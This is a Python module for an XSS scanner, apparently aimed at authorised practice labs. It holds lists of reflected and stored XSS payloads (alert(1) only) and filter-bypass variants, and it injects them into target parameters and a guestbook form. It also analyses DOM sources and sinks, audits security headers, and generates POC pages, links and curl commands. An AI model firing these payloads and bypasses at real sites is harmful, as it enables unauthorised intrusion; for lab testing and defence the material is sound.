# -*- coding: utf-8 -*-
"""反射型 XSS 引擎：过滤强度识别 + 反射上下文分析 + 绕过变体 + POC 生成。

所有 payload 均为无害的 alert(1) / console.log 验证串，不包含任何窃取凭据的逻辑。
"""

import html
import random
import re
import string
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

from .httpclient import HTTPError, Resp


BATTERY = [
    {"id": "script-basic", "payload": "<script>alert(1)</script>",
     "tag": "script 标签", "note": "最基础的反射验证"},
    {"id": "script-case", "payload": "<ScRiPt>alert(1)</ScRiPt>",
     "tag": "大小写混淆", "note": "绕过仅匹配小写标签的过滤"},
    {"id": "img", "payload": "<img src=x onerror=alert(1)>",
     "tag": "img 事件", "note": "不依赖 script 标签"},
    {"id": "svg", "payload": "<svg onload=alert(1)>",
     "tag": "svg 事件", "note": "短小，常见绕过向量"},
    {"id": "attr-break", "payload": "\"><img src=x onerror=alert(1)>",
     "tag": "属性闭合", "note": "逃逸 value 属性进入 HTML 主体"},
    {"id": "href", "payload": "<a href=\"javascript:alert(1)\">poc</a>",
     "tag": "伪协议", "note": "需用户点击触发"},
    {"id": "body", "payload": "<body onload=alert(1)>",
     "tag": "body 事件", "note": "页面加载即触发"},
    {"id": "details", "payload": "<details open ontoggle=alert(1)>",
     "tag": "details 事件", "note": "自动展开触发，少见于黑名单"},
]

LEVEL_TEXT = {
    "low": "LOW / 无有效过滤",
    "medium": "MEDIUM / 部分标签被过滤",
    "high": "HIGH / 强过滤或编码",
    "safe": "SAFE / 未形成可用反射",
    "unknown": "UNKNOWN / 无法判定",
}

DEEP_BATTERY = [
    {"id": "img-upper", "payload": "<IMG SRC=x ONERROR=alert(1)>",
     "tag": "大写事件", "note": "绕过大小写敏感的黑名单"},
    {"id": "img-entity", "payload": "<img src=x onerror=alert&#40;1&#41;>",
     "tag": "实体括号", "note": "括号被过滤时用 HTML 实体"},
    {"id": "svg-animate", "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
     "tag": "SVG animate", "note": "SVG 动画事件，少见于黑名单"},
    {"id": "svg-slash", "payload": "<svg/onload=alert(1)>",
     "tag": "SVG 斜杠", "note": "省略空格的标签写法"},
    {"id": "input-focus", "payload": "<input autofocus onfocus=alert(1)>",
     "tag": "autofocus", "note": "自动聚焦触发"},
    {"id": "select-focus", "payload": "<select autofocus onfocus=alert(1)>",
     "tag": "select focus", "note": "少见的表单标签向量"},
    {"id": "textarea-focus", "payload": "<textarea autofocus onfocus=alert(1)>",
     "tag": "textarea focus", "note": "文本域聚焦事件"},
    {"id": "video-source", "payload": "<video><source onerror=alert(1)>",
     "tag": "video source", "note": "媒体子标签错误事件"},
    {"id": "audio-error", "payload": "<audio src=x onerror=alert(1)>",
     "tag": "audio error", "note": "音频加载失败事件"},
    {"id": "marquee", "payload": "<marquee onstart=alert(1)>",
     "tag": "marquee", "note": "滚动开始事件"},
    {"id": "iframe-srcdoc", "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">",
     "tag": "iframe srcdoc", "note": "内联文档直接执行"},
    {"id": "object-js", "payload": "<object data=\"javascript:alert(1)\">",
     "tag": "object data", "note": "插件对象伪协议"},
    {"id": "embed-js", "payload": "<embed src=\"javascript:alert(1)\">",
     "tag": "embed src", "note": "嵌入对象伪协议"},
    {"id": "form-action", "payload": "<form action=\"javascript:alert(1)\"><button>go</button></form>",
     "tag": "form action", "note": "表单提交执行伪协议"},
    {"id": "math-mtext", "payload": "<math><mtext><img src=x onerror=alert(1)>",
     "tag": "MathML 嵌套", "note": "解析器命名空间差异"},
    {"id": "details-open", "payload": "<details open ontoggle=alert(1)>",
     "tag": "details 事件", "note": "自动展开触发"},
    {"id": "body-load", "payload": "<body onload=alert(1)>",
     "tag": "body onload", "note": "页面加载触发"},
    {"id": "anchor-js", "payload": "<a href=\"javascript:alert(1)\">x</a>",
     "tag": "伪协议", "note": "需一次点击"},
]


def php_escape(text: str) -> str:
    return (text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;").replace("'", "&#039;"))


def _rand(n=4):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class XssEngine:
    def __init__(self, agent, task):
        self.a = agent
        self.t = task

    @staticmethod
    def _now() -> str:
        import datetime
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ---------- 反射分析 ----------
    @staticmethod
    def classify_reflection(payload: str, body: str, baseline: str = "") -> str:
        # 页面本来就有这段内容（例如留言板里残留的历史载荷），不能算作本次反射
        if baseline and payload in baseline:
            return "preexisting"
        if payload in body:
            return "raw"
        candidates = {
            php_escape(payload),
            html.escape(payload, quote=True),
            html.escape(payload, quote=False),
        }
        for encoded in candidates:
            if encoded and encoded in body:
                return "encoded"
        # 标签被剥离但内容保留
        probe = payload.replace("<", "").replace(">", "")
        core = "alert(1)"
        if baseline and core in baseline:
            # 页面本来就有 alert(1) 文本（历史留言等），不能当成剥离后的残留
            return "preexisting"
        if core in body and probe and probe[:12] in body:
            return "partial"
        if core in body:
            return "partial"
        return "blocked"

    @staticmethod
    def context_of(payload: str, body: str) -> str:
        index = body.find(payload)
        if index < 0:
            return "unknown"
        before = body[:index]
        last_lt = before.rfind("<")
        last_gt = before.rfind(">")
        if last_lt > last_gt:
            seg = before[last_lt:]
            if "<!--" in before and "-->" not in before:
                return "comment"
            if before.rfind("<script") > before.rfind("</script"):
                return "javascript"
            if before.rfind("<textarea") > before.rfind("</textarea"):
                return "textarea"
            if before.rfind("<title") > before.rfind("</title"):
                return "title"
            if "=" in seg and ('="' in seg or "='" in seg):
                return "attribute"
            return "tag"
        if before.rfind("<script") > before.rfind("</script"):
            return "javascript"
        if before.rfind("<textarea") > before.rfind("</textarea"):
            return "textarea"
        return "html"

    CONTEXT_TEXT = {
        "html": "HTML 主体",
        "attribute": "HTML 属性值",
        "tag": "标签内部",
        "javascript": "脚本块",
        "textarea": "textarea 文本",
        "title": "title 文本",
        "comment": "HTML 注释",
        "unknown": "未知",
    }

    # ---------- 主流程 ----------
    def analyze(self, param: str) -> dict:
        self.t.info(f"目标参数：{param}")
        base = self.a.baseline()
        if "login.php" in base.url.lower():
            self.t.warn("响应跳到登录页，Cookie 可能失效")
        self.t.info(f"基线 {base.status} / {base.length}B")

        rows = []
        vuln = []
        for idx, item in enumerate(BATTERY, 1):
            self.t.check_stop()
            payload = item["payload"]
            try:
                resp = self.a.send({param: payload})
            except HTTPError as exc:
                self.t.err(str(exc))
                continue
            kind = self.classify_reflection(payload, resp.text, base.text)
            context = self.context_of(payload, resp.text) if kind == "raw" else "-"
            row = {
                "id": item["id"],
                "payload": payload,
                "tag": item["tag"],
                "note": item["note"],
                "reflection": kind,
                "context": context,
                "context_text": self.CONTEXT_TEXT.get(context, context),
                "status": resp.status,
                "length": resp.length,
            }
            rows.append(row)
            if kind == "raw":
                vuln.append(row)
                self.t.ok(f"[{idx}/{len(BATTERY)}] {item['tag']} 原样反射（{row['context_text']}）")
            elif kind == "encoded":
                self.t.info(f"[{idx}/{len(BATTERY)}] {item['tag']} 被编码输出")
            elif kind == "partial":
                self.t.warn(f"[{idx}/{len(BATTERY)}] {item['tag']} 被部分改写")
            elif kind == "preexisting":
                self.t.warn(f"[{idx}/{len(BATTERY)}] {item['tag']} 页面本来就有这段内容，"
                            f"不算本次反射")
            else:
                self.t.info(f"[{idx}/{len(BATTERY)}] {item['tag']} 未反射 / 被过滤")
            self.t.set_progress(idx / len(BATTERY), f"测试 payload {idx}/{len(BATTERY)}")

        level = self._level(rows)
        executable = [v for v in vuln if self._likely_executable(v)]
        note = ""
        if not executable and level in ("high", "safe"):
            note = ("所有向量均被编码或拦截。若目标使用 htmlspecialchars（如 DVWA High），"
                    "这是预期防护效果，通常不存在通用绕过。")
        self.t.step_msg(f"过滤强度判定：{LEVEL_TEXT[level]}")
        for item in executable:
            self.t.ok(f"可用 payload：{item['payload']}（{item['context_text']}）")

        return {
            "param": param,
            "level": level,
            "level_text": LEVEL_TEXT[level],
            "results": rows,
            "raw_reflections": vuln,
            "executable": executable,
            "note": note,
            "summary": (f"XSS {LEVEL_TEXT[level]}，可用 payload {len(executable)} 个"
                        if executable else f"XSS 未形成可用反射（{LEVEL_TEXT[level]}）"),
            "severity": "high" if executable else ("medium" if vuln else "info"),
        }

    @staticmethod
    def _likely_executable(row: dict) -> bool:
        if row["reflection"] != "raw":
            return False
        if row["context"] in ("html", "attribute", "tag", "comment"):
            return True
        if row["context"] == "javascript":
            return "alert(" in row["payload"]
        return False

    # ---------- 深度向量库 ----------
    def deep_scan(self, param: str) -> dict:
        self.t.step_msg(f"深度向量扫描：{param}（{len(DEEP_BATTERY)} 条）")
        base = self.a.baseline()
        if "login.php" in base.url.lower():
            self.t.warn("响应跳到登录页，Cookie 可能失效")
        rows = []
        executable = []
        for index, item in enumerate(DEEP_BATTERY, 1):
            self.t.check_stop()
            try:
                resp = self.a.send({param: item["payload"]})
            except HTTPError as exc:
                self.t.err(str(exc))
                continue
            kind = self.classify_reflection(item["payload"], resp.text, base.text)
            context = self.context_of(item["payload"], resp.text) if kind == "raw" else "-"
            row = {
                "id": item["id"],
                "payload": item["payload"],
                "tag": item["tag"],
                "note": item["note"],
                "reflection": kind,
                "context": context,
                "context_text": self.CONTEXT_TEXT.get(context, context),
                "status": resp.status,
                "length": resp.length,
            }
            rows.append(row)
            if kind == "raw" and context in ("html", "attribute", "tag", "comment"):
                executable.append(row)
                self.t.ok(f"[{index}/{len(DEEP_BATTERY)}] {item['tag']} 原样反射（{row['context_text']}）")
            else:
                self.t.info(f"[{index}/{len(DEEP_BATTERY)}] {item['tag']} 未通过（{kind}）")
            self.t.set_progress(index / len(DEEP_BATTERY), f"{index}/{len(DEEP_BATTERY)}")

        if executable:
            level = "medium"
        elif any(row["reflection"] in ("encoded", "partial") for row in rows):
            level = "high"
        else:
            level = "safe"
        self.t.ok(f"深度扫描完成：{len(executable)} 条可用")
        return {
            "mode": "deep",
            "param": param,
            "params": [param],
            "results": rows,
            "executable": executable,
            "level": level,
            "level_text": LEVEL_TEXT[level],
            "poc_param": param,
            "summary": f"深度向量 {len(DEEP_BATTERY)} 条，可用 {len(executable)} 条",
            "severity": "high" if executable else "info",
        }

    LEVEL_RANK = {"low": 0, "medium": 1, "high": 2, "safe": 3, "unknown": 4}

    def analyze_multi(self, params: list[str]) -> dict:
        self.t.step_msg(f"多参数扫描：{', '.join(params)}")
        rows: list[dict] = []
        executable: list[dict] = []
        per_param = []
        for index, param in enumerate(params, 1):
            self.t.check_stop()
            self.t.log(f"[{index}/{len(params)}] 参数 {param}", "step")
            result = self.analyze(param)
            for row in result.get("results", []):
                item = dict(row)
                item["param"] = param
                rows.append(item)
            for item in result.get("executable", []):
                enriched = dict(item)
                enriched["param"] = param
                executable.append(enriched)
            per_param.append({"param": param, "level": result["level"],
                              "level_text": result["level_text"],
                              "executable": len(result.get("executable", []))})
            self.t.set_progress(index / len(params), f"{index}/{len(params)} 参数")
        level = min((item["level"] for item in per_param),
                    key=lambda value: self.LEVEL_RANK.get(value, 9))
        return {
            "mode": "reflected",
            "params": params,
            "per_param": per_param,
            "level": level,
            "level_text": LEVEL_TEXT[level],
            "results": rows,
            "raw_reflections": [row for row in rows if row["reflection"] == "raw"],
            "executable": executable,
            "poc_param": executable[0]["param"] if executable else params[0],
            "summary": (f"扫描 {len(params)} 个参数，最弱级别 {LEVEL_TEXT[level]}，"
                        f"可用载荷 {len(executable)} 个"),
            "severity": "high" if executable else "info",
        }

    # ---------- DOM 型 XSS 静态分析 ----------
    SCRIPT_RE = re.compile(r"<script\b([^>]*)>([\s\S]*?)</script>", re.I)
    SRC_RE = re.compile(r"src\s*=\s*[\"']([^\"']+)[\"']", re.I)
    SOURCES = {
        "location.hash": r"location\s*\.\s*hash",
        "location.search": r"location\s*\.\s*search",
        "location.href": r"location\s*\.\s*href",
        "document.URL": r"document\s*\.\s*URL",
        "document.referrer": r"document\s*\.\s*referrer",
        "window.name": r"window\s*\.\s*name",
        "postMessage": r"addEventListener\s*\(\s*['\"]message",
    }
    SINKS = {
        "innerHTML": r"\.innerHTML\s*=",
        "outerHTML": r"\.outerHTML\s*=",
        "document.write": r"document\s*\.\s*write(?:ln)?\s*\(",
        "eval": r"\beval\s*\(",
        "setTimeout": r"setTimeout\s*\(\s*[^,)]*",
        "insertAdjacentHTML": r"insertAdjacentHTML\s*\(",
        "jQuery.html": r"\.html\s*\(",
        "new Function": r"new\s+Function\s*\(",
    }

    def dom_scan(self) -> dict:
        from urllib.parse import urljoin, urlparse

        self.t.step_msg("DOM 型 XSS 静态分析")
        page = self.a.raw("GET", self.a.base, params=self.a.query or None)
        host = urlparse(page.url).netloc
        scripts: list[tuple[str, str]] = []
        for match in self.SCRIPT_RE.finditer(page.text):
            attrs, body = match.group(1), match.group(2)
            if body.strip():
                scripts.append(("inline", body))
            else:
                src_match = self.SRC_RE.search(attrs)
                if not src_match:
                    continue
                src = urljoin(page.url, src_match.group(1))
                if urlparse(src).netloc != host or len(scripts) >= 10:
                    continue
                try:
                    resp = self.a.raw("GET", src)
                except HTTPError:
                    continue
                if len(resp.text) < 400_000:
                    scripts.append((src, resp.text))
        self.t.info(f"页面 {page.length}B，脚本 {len(scripts)} 段")

        findings = []
        source_hits = set()
        sink_hits = set()
        for name, body in scripts:
            src_found = []
            for label, pattern in self.SOURCES.items():
                for hit in re.finditer(pattern, body, re.I):
                    source_hits.add(label)
                    src_found.append((label, hit))
            sink_found = []
            for label, pattern in self.SINKS.items():
                for hit in re.finditer(pattern, body, re.I):
                    sink_hits.add(label)
                    sink_found.append((label, hit))
            if src_found and sink_found:
                for src_label, src_hit in src_found[:4]:
                    for sink_label, sink_hit in sink_found[:4]:
                        snippet = body[max(0, sink_hit.start() - 60): sink_hit.start() + 90]
                        findings.append({
                            "script": name,
                            "source": src_label,
                            "sink": sink_label,
                            "snippet": " ".join(snippet.split()),
                        })
                        if len(findings) >= 20:
                            break
                    if len(findings) >= 20:
                        break
            if len(findings) >= 20:
                break

        for item in findings:
            self.t.warn(f"{item['source']} → {item['sink']}（{item['script']}）")
        level = "high" if findings else ("info" if sink_hits else "safe")
        return {
            "mode": "dom",
            "level": level,
            "findings": findings,
            "sources": sorted(source_hits),
            "sinks": sorted(sink_hits),
            "scripts_scanned": len(scripts),
            "summary": (f"DOM 静态分析：{len(findings)} 处可疑数据流 / "
                        f"扫描 {len(scripts)} 段脚本"),
            "severity": "medium" if findings else "info",
        }

    # ---------- 响应头 / CSP 审计 ----------
    def headers_audit(self) -> dict:
        self.t.step_msg("响应头与 CSP 审计")
        page = self.a.raw("GET", self.a.base, params=self.a.query or None)
        headers = {key.lower(): (value or "") for key, value in page.headers.items()}
        checks = []
        penalty = 0

        def add(key, label, value, state, note, cost=0):
            nonlocal penalty
            penalty += cost
            checks.append({"key": key, "label": label, "value": value or "缺失",
                           "state": state, "note": note})

        csp = headers.get("content-security-policy", "")
        if csp:
            weak = "unsafe-inline" in csp.lower() or "unsafe-eval" in csp.lower()
            add("csp", "Content-Security-Policy", csp[:280],
                "warn" if weak else "ok",
                "包含 unsafe-inline / unsafe-eval，XSS 缓解有限" if weak else "已启用 CSP",
                12 if weak else 0)
        else:
            add("csp", "Content-Security-Policy", "", "bad",
                "未配置 CSP，反射 / 存储型 XSS 没有额外缓解", 25)

        xfo = headers.get("x-frame-options", "")
        add("xfo", "X-Frame-Options", xfo,
            "ok" if xfo else "bad",
            "已禁止被 iframe 嵌套" if xfo else "存在点击劫持风险", 0 if xfo else 15)

        xcto = headers.get("x-content-type-options", "")
        add("xcto", "X-Content-Type-Options", xcto,
            "ok" if "nosniff" in xcto.lower() else "warn",
            "已禁止 MIME 嗅探" if "nosniff" in xcto.lower() else "建议设置为 nosniff",
            0 if "nosniff" in xcto.lower() else 10)

        referrer = headers.get("referrer-policy", "")
        add("referrer", "Referrer-Policy", referrer,
            "ok" if referrer else "warn",
            "已限制 Referer 泄露" if referrer else "未设置，可能泄露敏感 URL", 0 if referrer else 5)

        xssp = headers.get("x-xss-protection", "")
        add("xssp", "X-XSS-Protection", xssp, "info",
            "旧版浏览器过滤器，现代浏览器已废弃" if xssp else "未设置（可忽略）", 0)

        cookie = headers.get("set-cookie", "")
        if cookie:
            missing = []
            if "httponly" not in cookie.lower():
                missing.append("HttpOnly")
            if "secure" not in cookie.lower() and page.url.lower().startswith("https"):
                missing.append("Secure")
            add("cookie", "Set-Cookie 属性", cookie[:200],
                "warn" if missing else "ok",
                ("缺少 " + " / ".join(missing)) if missing else "已设置安全属性",
                10 if missing else 0)
        else:
            add("cookie", "Set-Cookie 属性", "响应未设置 Cookie", "info", "无需检查", 0)

        powered = headers.get("x-powered-by", "")
        server = headers.get("server", "")
        if powered or server:
            add("banner", "指纹暴露", f"{server} {powered}".strip(),
                "warn", "建议隐藏 Server / X-Powered-By 版本信息", 5)
        else:
            add("banner", "指纹暴露", "未暴露", "ok", "响应头未泄露框架版本", 0)

        score = max(0, 100 - penalty)
        grade = "A" if score >= 85 else "B" if score >= 70 else "C" if score >= 50 else "D"
        problems = [item["label"] for item in checks if item["state"] in ("bad", "warn")]
        self.t.ok(f"防御评分 {score}/100（{grade}）")
        for item in checks:
            level = {"ok": "ok", "warn": "warn", "bad": "err"}.get(item["state"], "info")
            self.t.log(f"{item['label']}: {item['note']}", level)
        return {
            "mode": "headers",
            "score": score,
            "grade": grade,
            "checks": checks,
            "problems": problems,
            "status": page.status,
            "summary": f"响应头审计 {grade} 级（{score}/100）：" + ("、".join(problems[:4]) or "未发现明显问题"),
            "severity": "high" if grade == "D" else "medium" if grade in ("B", "C") else "info",
        }

    @staticmethod
    def _level(rows: list[dict]) -> str:
        by_id = {r["id"]: r for r in rows}
        basic = by_id.get("script-basic", {}).get("reflection")
        case = by_id.get("script-case", {}).get("reflection")
        event = any(by_id.get(k, {}).get("reflection") == "raw" for k in ("img", "svg", "body", "details"))

        if basic == "raw":
            return "low"
        if event or case == "raw":
            return "medium"
        if any(r["reflection"] == "raw" for r in rows):
            return "medium"
        if any(r["reflection"] in ("encoded", "partial") for r in rows):
            return "high"
        return "safe"

    # ---------- 变体 ----------
    def variants(self, param: str, base_payload: str) -> dict:
        self.t.step_msg("生成并验证绕过变体")
        base = self.a.baseline()
        tag = _rand(3)
        variants = [
            {"name": "大小写混淆", "payload": _mix_case(base_payload),
             "idea": "仅匹配小写关键字的过滤器"},
            {"name": "双写关键字", "payload": base_payload.replace("<script", "<scr<script>ipt")
             .replace("<SCRIPT", "<SCR<SCRIPT>IPT"), "idea": "非递归替换过滤器"},
            {"name": "HTML 实体括号", "payload": base_payload.replace("alert(1)", f"alert&#40;1&#41;"),
             "idea": "实体解码后执行"},
            {"name": "SVG 斜杠变形", "payload": f"<svg/onload=alert(1) data-x={tag}>",
             "idea": "省略空格，规避空格检测"},
            {"name": "伪协议制表符", "payload": "<a href=\"java\tscript:alert(1)\">poc</a>",
             "idea": "javascript: 中插入控制字符"},
            {"name": "事件属性拆分", "payload": f"<img src=x onerror=alert(1) {tag}=1>",
             "idea": "增加无关属性干扰正则"},
        ]
        rows = []
        for idx, item in enumerate(variants, 1):
            self.t.check_stop()
            try:
                resp = self.a.send({param: item["payload"]})
            except HTTPError as exc:
                self.t.err(str(exc))
                continue
            kind = self.classify_reflection(item["payload"], resp.text, base.text)
            context = self.context_of(item["payload"], resp.text) if kind == "raw" else "-"
            item.update({"reflection": kind,
                         "context_text": self.CONTEXT_TEXT.get(context, context)})
            rows.append(item)
            level = "ok" if kind == "raw" else "info"
            self.t.log(f"{item['name']}：{'原样反射' if kind == 'raw' else '未通过'}", level)
            self.t.set_progress(idx / len(variants), f"验证变体 {idx}/{len(variants)}")
        working = [r for r in rows if r["reflection"] == "raw"]
        self.t.ok(f"{len(working)}/{len(rows)} 个变体可用")
        return {"variants": rows, "working": working}

    # ---------- 存储型 XSS ----------
    STORED_IDS = ("script-basic", "script-case", "img", "svg", "attr-break")

    def analyze_stored(self, submit_url: str, verify_url: str, name_field: str,
                       message_field: str, extra: dict, deep: bool = False) -> dict:
        self.t.step_msg("存储型 XSS 检测" + ("（深度向量）" if deep else ""))
        self.t.info(f"提交：POST {submit_url}")
        self.t.info(f"校验：GET {verify_url}")
        self.t.warn("检测会向靶场留言板写入无害的 alert(1) 载荷，请在演示库中使用")

        if deep:
            # 深度模式额外带上最基础的 script 向量，用于区分「完全不过滤」与「仅拦 script」
            core = [item for item in BATTERY if item["id"] == "script-basic"]
            battery = core + list(DEEP_BATTERY)
        else:
            battery = [item for item in BATTERY if item["id"] in self.STORED_IDS]
        rows = []
        vuln = []
        stored_ok = 0
        first_poc = None

        for idx, item in enumerate(battery, 1):
            self.t.check_stop()
            tag = "poc" + _rand(4)
            data = {name_field: tag, message_field: item["payload"]}
            data.update(extra or {})
            try:
                post = self.a.raw("POST", submit_url, data=data)
                verify = self.a.raw("GET", verify_url, params={"_t": _rand(6)})
            except HTTPError as exc:
                self.t.err(str(exc))
                continue
            stored = tag in verify.text
            if stored:
                stored_ok += 1
            kind = self.classify_reflection(item["payload"], verify.text)
            context = self.context_of(item["payload"], verify.text) if kind == "raw" else "-"
            row = {
                "id": item["id"],
                "payload": item["payload"],
                "tag": item["tag"],
                "note": item["note"],
                "reflection": kind,
                "context": context,
                "context_text": self.CONTEXT_TEXT.get(context, context),
                "stored": stored,
                "status": verify.status,
                "length": verify.length,
            }
            rows.append(row)
            if kind == "raw":
                vuln.append(row)
                self.t.ok(f"[{idx}/{len(battery)}] {item['tag']} 已持久化并原样输出")
            elif not stored:
                self.t.warn(f"[{idx}/{len(battery)}] {item['tag']} 未在页面中找到，检查字段名 / 提交按钮")
            elif kind == "encoded":
                self.t.info(f"[{idx}/{len(battery)}] {item['tag']} 已写入但被编码")
            else:
                self.t.info(f"[{idx}/{len(battery)}] {item['tag']} 未形成有效输出")
            if kind == "raw" and first_poc is None:
                first_poc = data
            self.t.set_progress(idx / len(battery), f"提交 {idx}/{len(battery)}")

        if not stored_ok:
            self.t.err("所有载荷都未出现在校验页面：请确认字段名、提交按钮参数与校验 URL")

        level = self._level(rows)
        executable = [v for v in vuln if v["context"] in ("html", "attribute", "tag", "comment")]
        note = ""
        if not executable and level in ("high", "safe"):
            note = ("载荷被写入但输出被编码 / 过滤；High 级别通常使用 htmlspecialchars，"
                    "属于预期防护，没有通用绕过。")
        poc_html = ""
        if first_poc:
            poc_html = self.build_stored_poc(submit_url, first_poc)
            self.t.ok("已生成存储型 POC 提交页")
        self.t.step_msg(f"过滤强度判定：{LEVEL_TEXT[level]}")
        return {
            "mode": "stored",
            "level": level,
            "level_text": LEVEL_TEXT[level],
            "results": rows,
            "raw_reflections": vuln,
            "executable": executable,
            "stored_count": stored_ok,
            "note": note,
            "poc_html": poc_html,
            "submit_url": submit_url,
            "summary": (f"存储型 XSS {LEVEL_TEXT[level]}，持久化 {stored_ok}/{len(battery)}，"
                        f"可用载荷 {len(executable)} 个"),
            "severity": "high" if executable else "info",
        }

    @staticmethod
    def build_stored_poc(submit_url: str, fields: dict) -> str:
        inputs = "\n".join(
            f'    <input type="hidden" name="{html.escape(str(k), quote=True)}" '
            f'value="{html.escape(str(v), quote=True)}">'
            for k, v in fields.items()
        )
        return f"""<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8">
<title>Stored XSS POC / 授权靶场验证</title>
<style>
  body{{background:#070b12;color:#cfe8f5;font-family:Consolas,monospace;padding:40px}}
  .box{{max-width:760px;border:1px solid #17384a;border-radius:10px;padding:24px;background:#0b1420}}
  h1{{color:#22e0ff;font-size:18px}} code{{color:#3dff9e;word-break:break-all}}
  button{{background:#22e0ff;border:0;padding:10px 18px;border-radius:6px;font-weight:700;cursor:pointer}}
</style></head><body>
<div class="box">
  <h1>Stored XSS POC</h1>
  <p>目标：<code>{html.escape(submit_url)}</code></p>
  <p>此页面可向留言板提交一条无害载荷，点击下方按钮后可在靶场留言页看到执行效果。</p>
  <form id="poc" method="POST" action="{html.escape(submit_url, quote=True)}">
{inputs}
    <button type="submit">提交载荷</button>
  </form>
  <p id="state"></p>
</div>
<script>
  document.getElementById('poc').addEventListener('submit', function () {{
    document.getElementById('state').textContent = '正在提交…';
  }});
</script>
</body></html>"""
    def build_poc(self, param: str, payloads: list[str], target_url: str) -> dict:
        self.t.step_msg("生成 POC")
        parsed = urlparse(target_url)
        base_pairs = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
                      if k != param]
        links = []
        for payload in payloads[:6]:
            query = urlencode(base_pairs + [(param, payload)])
            links.append(urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, "")))

        html_parts = [
            "<!DOCTYPE html>", "<html lang=\"zh-CN\"><head><meta charset=\"utf-8\">",
            "<title>XSS POC / 授权靶场验证</title>",
            "<style>body{background:#070b12;color:#cfe8f5;font-family:Consolas,monospace;padding:32px}"
            "h1{color:#22e0ff;font-size:20px}.item{border:1px solid #17384a;padding:14px;margin:12px 0;"
            "border-radius:6px;background:#0b1420}code{color:#3dff9e;word-break:break-all}"
            "a{color:#ff2f87}</style></head><body>",
            "<h1>XSS POC — 授权靶场验证</h1>",
            f"<p>目标：<code>{html.escape(target_url)}</code></p>",
            f"<p>参数：<code>{html.escape(param)}</code> / 共 {len(links)} 条链路</p>",
        ]
        for idx, link in enumerate(links, 1):
            html_parts.append(
                f"<div class=\"item\"><div>POC #{idx}</div>"
                f"<code>{html.escape(link)}</code><br><br>"
                f"<a href=\"{html.escape(link)}\" target=\"_blank\">打开触发链接</a></div>")
        html_parts.append("</body></html>")
        poc_html = "\n".join(html_parts)

        lines = ["# XSS POC — 授权靶场验证", "", f"- 目标：{target_url}",
                 f"- 参数：{param}", f"- 生成时间：{self._now()}", ""]
        for idx, payload in enumerate(payloads[:6], 1):
            link = links[idx - 1]
            curl = f"curl -s -b '<COOKIE>' '{link}'"
            py = (f"import requests\n"
                  f"r = requests.get('{target_url}', params={{{param!r}: {payload!r}}},\n"
                  f"                 headers={{'Cookie': '<COOKIE>'}})\n"
                  f"print(payload in r.text)")
            lines += [f"## POC #{idx}", "", "```html", payload, "```", "",
                      "URL:", "", "```", link, "```", "",
                      "cURL:", "", "```bash", curl, "```", "",
                      "Python:", "", "```python", py, "```", ""]
        markdown = "\n".join(lines)
        self.t.ok(f"已生成 {len(links)} 条触发链路")
        return {"links": links, "html": poc_html, "markdown": markdown}


def _mix_case(text: str) -> str:
    out = []
    upper = True
    for ch in text:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return "".join(out)
